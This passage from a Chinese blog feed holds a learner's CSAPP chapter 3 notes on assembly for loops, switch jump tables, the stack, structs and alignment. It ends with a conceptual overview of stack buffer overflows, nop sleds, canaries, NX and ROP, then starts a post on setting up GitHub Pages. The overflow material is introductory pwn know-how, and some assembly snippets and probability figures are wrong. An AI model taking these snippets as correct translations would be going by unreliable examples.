class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">do</span>&#123;<br>        <span class="hljs-comment">//something</span><br>        i--;<br>    &#125;<span class="hljs-keyword">while</span>(i&gt;=<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>那么除了 do - while 我们还有 while，for 三种类型的循环。</p><p>它们的模板分别是什么样的呢，我们来看看。</p><p>while 的 C 写法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">while</span>(i&gt;=<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-comment">//something</span><br>        i--;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>对应的汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">    movq $10,%rcx<br>do:<br>    subq $1,%rcx<br>    test %rcx,%rcx<br>    js end<br>    ;do something<br>    jmp do<br>end:<br>    ret<br></code></pre></td></tr></table></figure><p>for 的 C 写法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)&#123;<br>        <span class="hljs-comment">//something</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>对应的汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">movq %rcx,0<br>do:<br>    ;something<br>    addq %rcx,$1<br>    cmpq $10,%rcx<br>    jl do<br></code></pre></td></tr></table></figure><p>如果循环语句中有 continue，我们就跳过循环体中的所有逻辑，直接到循环条件判断和循环变量的修改，如果有 break 我们直接跳出循环即可。</p><p>要点：<strong>掌握循环结构的写法和循环的判断</strong>。</p><h3 id="switch语句"><a href="#switch语句" class="headerlink" title="switch语句"></a>switch语句</h3><p>其实有人说，switch 就可以理解为 if elseif else if … 的形式，其实从实现来说，两者并没有太大的差别，但是执行效率上会有巨大差别，如果语句在第 n+1 个条件成立了，那么程序进行了 n+1 次判断。而 switch 语句在多数情况下（case语句超过四条，值的跨度小）并没有使用条件转移来区分各个值之间的跳转，当然它会区分一般值和默认值（default），一般值我们使用跳转表的形式实现。</p><p>比如如下的语句：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> test&#123;<br>    <span class="hljs-type">long</span> val=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">switch</span>(n)&#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            val+=<span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            val-=<span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>            val*=<span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>            val-=<span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            val++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> val;<br>&#125;<br></code></pre></td></tr></table></figure><p>将它翻译为汇编语言之后可能会出现这样的逻辑：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.L1:<br>    .quad .L2<br>    .quad .L3<br>    .quad .L4<br>    .quad .L5<br>    .quad .L6<br><br>test proc:<br>    movq $1,%rax<br>    subq $1,%rdi<br>    cmpq $3,%rdi<br>    ja L6<br>    jmp *.L1(,%rdi,8)<br>L2:<br>    addq $2,%rax<br>    jmp end<br>L3: <br>    subq $2,%rax<br>    jmp end<br>L4:<br>    mul $2,%rax<br>    jmp end<br>L5:<br>    div $2,%rax<br>    jmp end<br>L6:<br>    addq $1,%rax<br>end:<br>    ret<br>test endp<br></code></pre></td></tr></table></figure><p>我们可以看到跳转表的一个优势所在，对于每一个条件，都可以只进行一次判断就跳转到指定位置运行，当然我们实际在用的时候，可能会出现空语句，或者是滑落的情况（即语句下面没有 break），如果出现滑落，我们就删除对应语句块的 jmp 命令，如果出现空语句（case 后面没有语句），我们不新增加标签，而是直接设置跳转表的位置为下一个有值的标签。</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>过程是软件中一种很重要的抽象。他提供了一种封装代码的方式，用一组指定的参数和一个可选的返回值实现了某种功能。然后我们可以在程序中不同的地方调用这个函数。</p><h3 id="运行时栈"><a href="#运行时栈" class="headerlink" title="运行时栈"></a>运行时栈</h3><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250425161958-mqb2h8b.png" alt="image"></p><p>我感觉学习pwn的没有不熟悉这张图的吧</p><p>C 语言调用机制的一个关键特性就是使用了栈结构提供的后进先出的管理原则。当P</p><p>调用Q的时候，我们需要保存P的状态，并为Q开辟出一块位置存放Q所需要的东西。当Q运行完返回P时，我们需要将Q占用的位置释放，并且恢复到调用Q函数之前的那种状态，除了rax用于保存返回值不需要恢复。</p><p>上面的图反映的状态就是调用Q时栈上的分布。</p><h3 id="转移控制"><a href="#转移控制" class="headerlink" title="转移控制"></a>转移控制</h3><p>在我们调用Q时，我们只需要把rip的值改为Q代码运行的地方就可以开始执行Q的指令，但是当Q执行结束，我们该继续执行P中的语句时，我们也该将rip中的值改到我们需要执行的P中的指令的地址。</p><p>这时候，就需要使用call指令</p><p>call指令的作用是先将当前指令下一步指令地址的值放入栈中（也就是我们说的返回地址），然后跳转到Q代码的地址开始执行，在Q执行结束之后调用ret，将之前放在栈上的返回地址放入到rip中</p><h3 id="数据传送"><a href="#数据传送" class="headerlink" title="数据传送"></a>数据传送</h3><p>众所周知，一般我们调用一个函数都是有参数的，例如int add(int a,int b),我们调用的时候格式就为add(3,4)</p><p>如果我们想运行这个函数，在调用到这个函数的时候就需要把参数也交给这个函数，所以我们得知道，我们是怎么将这个参数交给这个函数的</p><p>在x86-64架构的下，传参是由寄存器进行传参的：<strong>前六个参数分别传递给寄存器 %rdi,%rsi,%rdx,%rcx,%r8,%r9，若还有剩余参数，剩余参数从右往左依次入栈。</strong></p><h3 id="栈上的局部存储"><a href="#栈上的局部存储" class="headerlink" title="栈上的局部存储"></a>栈上的局部存储</h3><p>有些时候，局部数据必须存放在内存中，常见的情况：</p><p>1.寄存器不足够存放本地所有的本地数据</p><p>2.对一个局部变量使用地址运算符’&amp;’,因此必须能够为他产生一个地址</p><p>3.某些局部变量是数组或结构，因此必须能够通过数组或结构引用被访问到</p><h3 id="寄存器中的局部存储空间"><a href="#寄存器中的局部存储空间" class="headerlink" title="寄存器中的局部存储空间"></a>寄存器中的局部存储空间</h3><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250417175323-mhvemb1.png" alt="image"></p><p>这是我们之前看过的图，在它上面写了调用者保存和被调用者保存，这是当我们在调用函数的时候，可能会修改一些寄存器的值，但是，当我们程序结束返回的时候，除了rax这些寄存器的值应该恢复到调用函数前的值，所以这些值是怎么保存的呢</p><p>调用者保存:调用函数的代码（调用者）负责保存那些在函数调用过程中可能被改变的寄存器。</p><p>在调用函数之前，调用者会先保存这些寄存器的值，通常是通过将寄存器的值压入栈中。被调用的函数执行时，会使用这些寄存器。如果被调用的函数修改了它们，调用者在返回时会从栈中恢复寄存器的值。</p><p>被调用者保存：被调用的函数负责保存它自己使用的寄存器</p><p>被调用的函数在开始时保存它需要使用的寄存器的值，通常将这些寄存器的值压入栈中。被调用的函数执行时，可以修改这些寄存器，但在函数返回之前，它必须恢复寄存器的原始值。</p><h2 id="数组分配和访问"><a href="#数组分配和访问" class="headerlink" title="数组分配和访问"></a>数组分配和访问</h2><p>C语言中的数组是一种将标量数据集成更大数据类型的方式。</p><h3 id="基本原则"><a href="#基本原则" class="headerlink" title="基本原则"></a>基本原则</h3><p>对于数据类型T和整形常熟N，起始位置为X，L为数据类型T的大小</p><p>如果我申明T A[N]</p><p>这表示我申请了一块LN大小的连续空间，起始位置是X，我们可以用0~N-1对这一空间的所有数进行索引。元素i的地址为X+i*L</p><p>例如：</p><p>int a[10],我们知道int类型大小为4字节，所以开辟了40个字节的空间存放a数组</p><p>假设起始位置为0x400000，那么a数组中每一个元素位置为0x400000+4*i</p><h3 id="指针运算"><a href="#指针运算" class="headerlink" title="指针运算"></a>指针运算</h3><p>C语言允许对指针进行运算，而计算出来的值会根据该指针引用的数据类型的大小进行伸缩。p+i 相当于 Xp+i*sizeof(type) 的地址（Xp 表示数组 p 的基地址）。</p><p>此外，书上还介绍了&amp;和*</p><p>&amp;为取地址符，根据这个名字，我们也该知道这个符号的作用是取出变量的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 汇编">例如<br>b=&amp;a；//这是将a变量存在的地址交给b<br></code></pre></td></tr></table></figure><p>*为解引用运算符，这个符号的作用是访问指针所指向的地址上的值</p><p>根据上个例子，现在b为a的地址，如果a的内容为5<br>那么*b就为5</p><h3 id="嵌套数组"><a href="#嵌套数组" class="headerlink" title="嵌套数组"></a>嵌套数组</h3><p>当我们定义了一个 int A[5][3] 时，相当于做了如下定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> <span class="hljs-type">row3_t</span>[<span class="hljs-number">3</span>];<br><span class="hljs-type">row3_t</span> A[<span class="hljs-number">5</span>];<br></code></pre></td></tr></table></figure><p>将A看作一个有5个元素的数组，每个元素都是三个int的数组，所以关于A中元素的地址的计算公式为&amp;A[i][j]&#x3D;XA(起始地址)+4(int类型大小) *(5**i+j)</p><h2 id="异质的数据结构"><a href="#异质的数据结构" class="headerlink" title="异质的数据结构"></a><span data-type="text" style="white-space-collapse: break-spaces;">异质的数据结构</span></h2><p>C语言提供了两种将不同类型的对象组合到一起创建数据类型的机制:</p><p>1.结构(structure),用关键字 struct 来声明,将多个对象集合到一个单位中;</p><p>2.联合(union),用关键 字 union 来声明,允许用几种不同的类型来引用一个对象。</p><h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><p>C语言的struct声明创建一个数据类型，将可能不同类型的对象聚合到一个对象中。用名字来引用结构的各个组成部分。类似于数组的实现,结构的所有组成部分都存放在内存中一段连续的区域内,而指向结构的指针就是结构第一个字节的地址。</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs 汇编">struct rec &#123;<br>int i;<br>int j;<br>int a [2];<br>int *p;<br>&#125;;<br></code></pre></td></tr></table></figure><p>然后内存中的排列为</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250426214913-kmsaupa.png" alt="image">9</p><p>我们看到，我们将声明的数组嵌套在这个结构体空间中，尽管这些并不是同一个类型的数据，但是我们仍然将他存储到一个对象中，通过偏移进行查找</p><h3 id="联合"><a href="#联合" class="headerlink" title="联合"></a>联合</h3><p>联合提供了一种方式,能够规避C语言的类型系统,允许以多种类型来引用一个对 象。联合声明的语法与结构的语法一样,只不过语义相差比较大。它们是用不同的字段来引用相同的内存块。</p><p>联合和结构体不同的点在于，结构体为它声明的每个变量都分配了一个空间，但是联合是是大家共用的一个空间</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs 汇编">union rec &#123;<br>int i;<br>int j;<br>int a [2];<br>int *p;<br>&#125;;<br></code></pre></td></tr></table></figure><p>这个例子和上一个相似，但是这个分配的空间就只有八（最大的那一个数据所分配的空间）所以它同一时间只允许一个数据存在在这个空间中</p><h3 id="数据对齐"><a href="#数据对齐" class="headerlink" title="数据对齐"></a>数据对齐</h3><p>对于 C 语言而言，为了方便内存管理会对数据类型做出这样的规定：大小为 n(n&lt;&#x3D;8) 的数据必须对齐在地址为 n 的倍数上，如果当前地址不符合要求则会往后顺延，中间的内存可能会因为填充产生浪费。</p><p>假设你有一个包含以下数据类型的结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Data</span> &#123;</span><br>    <span class="hljs-type">char</span> a;       <span class="hljs-comment">// 1 byte</span><br>    <span class="hljs-type">int</span> b;        <span class="hljs-comment">// 4 bytes</span><br>    <span class="hljs-type">char</span> c;       <span class="hljs-comment">// 1 byte</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>按我们之前学习的知识来看，他应该在空间中占据6个字节的空间，但是事实上，它占据了12个字节</p><p>为什么会占据12个字节，为了提高访问效率，结构体的内存对齐要求通常是其最大成员的对齐方式。即一个结构体的对齐方式是它最大成员类型的对齐大小</p><hr><p>当时学的时候其实没有太过深入的去理解这一个点，只以为每一个成员变量都会按照结构体中的最大成员变量进行对齐，但其实并不是这样，现在我将结合例子更深入的探讨一下这个问题。</p><p>在我们之前的例子里面，结构体是这样的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">struct Data &#123;<br>    char a;       // <span class="hljs-number">1</span> byte<br>    <span class="hljs-built_in">int</span> b;        // <span class="hljs-number">4</span> <span class="hljs-built_in">bytes</span><br>    char c;       // <span class="hljs-number">1</span> byte<br>&#125;;<br></code></pre></td></tr></table></figure><p>这个结构体在内存中占据的大小确实是12字节</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/4494a74788aaeab67d84c4df16b2e7ff-20251109193148-ejvvwew.png" alt="4494a74788aaeab67d84c4df16b2e7ff"></p><p>但是如果结构体稍微修改一下顺序，变成这样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">struct Data &#123;<br>    char a;       // <span class="hljs-number">1</span> byte<br>char b;       // <span class="hljs-number">1</span> byte<br>    <span class="hljs-built_in">int</span> c;        // <span class="hljs-number">4</span> <span class="hljs-built_in">bytes</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>此时结构体的大小就会变成8字节，简单的顺序修改就使得整个结构体空间变小</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251109193421-ypx3l6q.png" alt="image"></p><p>然后我们可以在创建一个更复杂的结构体</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">struct Data &#123;<br>    char a;       // <span class="hljs-number">1</span> byte<br>    <span class="hljs-built_in">int</span> b;        // <span class="hljs-number">4</span> <span class="hljs-built_in">bytes</span><br>long c;       // <span class="hljs-number">8</span> <span class="hljs-built_in">bytes</span><br><span class="hljs-built_in">int</span> d;        // <span class="hljs-number">4</span> <span class="hljs-built_in">bytes</span><br>char e;  // <span class="hljs-number">1</span> <span class="hljs-built_in">bytes</span><br>char f;  // <span class="hljs-number">1</span> <span class="hljs-built_in">bytes</span><br><span class="hljs-built_in">int</span> g;  // <span class="hljs-number">4</span> <span class="hljs-built_in">bytes</span><br>long h;  // <span class="hljs-number">8</span> <span class="hljs-built_in">bytes</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20251109200422-m8crf6q.png" alt="image"></p><p>可以看到最开始char a先4字节对齐，然后和int b一起形成了8字节对齐，后面的char e和char f紧挨着然后填充两字节形成了4字节对齐，和前面的int d刚好形成了8字节对齐。</p><p>从这三个例子中，我们可以看出，结构体中的数据对齐并不是每个成员都按照最大成员进行对齐的，而是**<u>结构体的总大小一定是最大成员大小的整数倍，至于小于最大成员的其余成员，则按照自己大小的倍数进行对齐</u>**。</p><p>例如在我们的第三个例子中char a先占据了1字节大小，然后要放入int b，int b自身大小为4字节，所以需要按照4字节对齐，因此给char a后填充了三个字节使得b可以对齐4，后面应该将8字节的long c放入内存，所以应该按照8字节对齐，前面的char a对齐4字节后再加上int b刚好8字节对齐了，所以不需要填充，直接把long c放入内存，后面的也是相同的，就不加赘述了</p><hr><h2 id="在机器即程序中将控制与数据结合起来"><a href="#在机器即程序中将控制与数据结合起来" class="headerlink" title="在机器即程序中将控制与数据结合起来"></a>在机器即程序中将控制与数据结合起来</h2><p>好了，在前面学习了那么多的东西，到最后一点了，我们才开始看关于真正会在pwn里面利用的部分</p><h3 id="理解指针"><a href="#理解指针" class="headerlink" title="理解指针"></a>理解指针</h3><p>一些指针和它们映射到机器代码的关键原则：</p><ul><li><strong>每个指针都有一个类型</strong>：指针的类型决定了它指向的数据类型及其访问方式。</li><li><strong>每个指针都有一个值</strong>：指针存储的是一个内存地址，该地址指向实际的数据。</li><li><strong>指针用</strong>​ <strong>​<code>&amp;</code>​</strong> ​<strong>运算符创建</strong>：<code>&amp;</code> 运算符返回一个变量的地址，用于创建指针。</li><li>​ <strong>​<code>*</code>​</strong> ​ <strong>操作符用于间接引用指针</strong>：通过 <code>*</code> 运算符，可以访问指针指向的值（解引用）。</li><li><strong>数组与指针紧密联系</strong>：数组名本质上是指向数组首元素的指针，指针可以通过索引访问数组元素。</li><li><strong>将指针从一种类型强制转换成另一种类型，只改变它的类型，而不改变它的值</strong>：通过强制类型转换，你可以改变指针的类型，但指向的内存地址不变。</li><li><strong>指针也可以指向函数：</strong> 这提供了一个很强大的存储和向代码传递引用的功能,这些引用 可以被程序的某个其他部分调用。</li></ul><p>对于以下声明:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> (*f)(<span class="hljs-type">int</span>*);<br></code></pre></td></tr></table></figure><p> 要从里(从“f”开始)往外读。因此,我们看到像<code>“(*f)”</code>​表明的那样,f是一个指针; 而<code>“(*f)(int* )”</code>​表明f是一个指向函数的指针,这个函数以一个int* 作为参数。 最后,我们看到,它是指向以 <code>int *</code> 为参数并返回 int 的函数的指针。</p><p> <code>*f </code>​两边的括号是必需的,否则声明变成<code> int *f(int*);</code>​ 它会被解读成 <code>(int *) f(int*);</code>​ 也就是说,它会被解释成一个函数原型,声明了一个函数,它以一个int * 作为参数 并返回一个int*。</p><h3 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h3><p>GNU 调试器 GDB 提供了许多有用的特性，允许我们机器级分析，具体可以用</p><p>plaintext</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$gdb file<br></code></pre></td></tr></table></figure><p>来进入 gdb shell 调试程序，输入 help 可以查看具体命令和效果，常见的有</p><table><thead><tr><th>命令</th><th>效果</th></tr></thead><tbody><tr><td>run</td><td>运行程序（在此给出参数）</td></tr><tr><td>quit</td><td>退出</td></tr><tr><td>kill</td><td>杀死程序</td></tr><tr><td>b xxx</td><td>下断点</td></tr><tr><td>delete</td><td>删除断点</td></tr><tr><td>s</td><td>单步运行</td></tr><tr><td>si</td><td>机器级单步运行</td></tr><tr><td>n</td><td>步过运行</td></tr><tr><td>ni</td><td>步过运行</td></tr><tr><td>c</td><td>继续运行</td></tr><tr><td>finish</td><td>步过运行直到ret</td></tr><tr><td>disass</td><td>查看反汇编代码</td></tr><tr><td>p</td><td>打印数据</td></tr><tr><td>info register</td><td>查看寄存器</td></tr><tr><td>help</td><td>调出手册</td></tr></tbody></table><h3 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h3><p>由于C对于数组引用不进行任何边界检查,而且局部变量和状态信息(例 如保存的寄存器值和返回地址)都存放在栈中。这两种情况结合到一起就能导致严重的程 序错误,对越界的数组元素的写操作会破坏存储在栈中的状态信息。当程序使用这个被破坏的状态,试图重新加载寄存器或执行 ret 指令时,就会出现很严重的错误。</p><p>一种特别常见的状态破坏称为缓冲区溢出(buffer overflow)。通常,在栈中分配某个 字符数组来保存一个字符串,但是字符串的长度超出了为数组分配的空间。</p><p>又得拿出这张图片了</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-04-25%20161956-20250427004711-bz7enn8.png" alt="屏幕截图 2025-04-25 161956"></p><p>我们在函数被调用时的输入放在局部变量中，当我们的输入超过为它所分配的位置，将逐步占据栈上的被保存寄存器和返回地址（为什么向上增长，数据由低地址向高地址增长）。通过我们之前的学习得知，返回地址为被调用函数执行结束时要运行的指令地址，如果这时候我们修改这个地址为我们自己想要执行的位置（比如后门）就可以获得shell了</p><h3 id="对抗缓冲区溢出"><a href="#对抗缓冲区溢出" class="headerlink" title="对抗缓冲区溢出"></a>对抗缓冲区溢出</h3><p>为了对抗缓冲区溢出，研究出了几种对抗方法，这也是我们现在会遇到的保护机制</p><ol><li>栈随机化</li><li>栈破坏检测</li><li>栈不可执行</li></ol><p>一般情况下，程序每次运行的虚拟地址都是固定不变的，这样会使得程序更容易遭受攻击，栈随机化使得每次程序运行时栈的位置都有变化，这类技术我们成为 <strong>地址空间布局随机化（Address-Space Layout Randomization）</strong>  当然，有防御，就会有攻击方法。我们只需要在缓冲区中插入比较多的 nop 指令，那么我们只要任意命中一个 nop 都可以导致我们恶意代码的顺利执行。这个序列的常用术语是 nop sled 差不多就是一直滑过去。如果随机化的可能性达到了 2^21，那么如果命中位置只有一个的话，我们就要赌这 2^(-21) 的概率，这显然不太能被接受，假如我们插入了 255 字节的 nop，那么我们任意命中 256 中的其中一个，我们都可以执行成功，概率直接缩小到 2^13，这个数字大小能稍微被接受了。</p><p>第二个思路是在造成严重的后果之前尽可能检测到栈溢出了，思想就是往返回地址之前插入一段随机数，在函数即将返回的时候，检查这段随机数是否被更改，如果被更改，调用 __stack_chk_fail 函数进行异常处理终止程序运行。一般这个随机数我们称为 canary（<strong>金丝雀</strong>，实际在下矿的时候主要用于探测煤矿是否有毒），现在的 gcc 版本默认添加 canary，但是我们可以通过参数 -fno-stack-protector 参数关闭这个保护。</p><p>第三个思路就是<strong>NX（NO EXECUTE）</strong> 让栈中不可执行代码，我们往栈中插入代码的思想也就变的不可行了，但是我们仍然可以使用 ROP 的思想去绕过这一保护。</p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>终于写完了，好累，第一次文章，还是这么长的文章，参考了很多<a href="https://xia0ji233.pro/2022/09/22/CSAPP_3/">xia0ji233</a>师傅的内容和文章结构（师傅写得实在是太好了），我自己在读这一章的时候好多地方理解的不太清楚，参考了一些其他相关的文章和gpt给的解释，如果文章里面有什么错误，请一定要留言告诉我</p>]]></content>
    
    
    <categories>
      
      <category>书籍阅读</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>搭建一个属于自己的个人博客</title>
    <link href="/post/build-a-personal-blog-of-your-own-1qpsrd.html"/>
    <url>/post/build-a-personal-blog-of-your-own-1qpsrd.html</url>
    
    <content type="html"><![CDATA[<h1 id="搭建一个属于自己的个人博客"><a href="#搭建一个属于自己的个人博客" class="headerlink" title="搭建一个属于自己的个人博客"></a>搭建一个属于自己的个人博客</h1><p>最近感觉自己需要一个个人博客来记录一下自己写的东西，就开始和队里师傅dre4m一起开始搭建，第一次搭建个人博客真的是非常的困难，最后好在也是搭好了，写一篇文章记录一下。</p><p>感谢Wh1teJ0ker提供的方案，使用思源一键化上传文章到自己的个人博客，弄好了直接使用思源插件发布文章就可以了，真的非常方便。</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><h3 id="思源准备"><a href="#思源准备" class="headerlink" title="思源准备"></a>思源准备</h3><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402135424.png" alt="image"></p><p>在你的思源里面下载这两个插件</p><h3 id="github准备"><a href="#github准备" class="headerlink" title="github准备"></a>github准备</h3><p>1.准备一个github账号，并创建一个yourname.github.io仓库</p><p>类似于这样</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/20250402133756.png" alt="image"></p><p>我的github名为N1mbus-lock,就创建一个N1mbus-lock.github.io的仓库</p><p><a href="https://pages.github.com/">https://pages.github.com/</a></p><p>只在再在这个仓库里面写入你的index.html(名字必须得为index.html)，在进行访问<a href="https://n1mbus.github.io/">https://N1mbus.github.io</a> 就可以访问到你写的页面了</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>N1mbus<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>N1mbus的个人主页<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello ~<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span 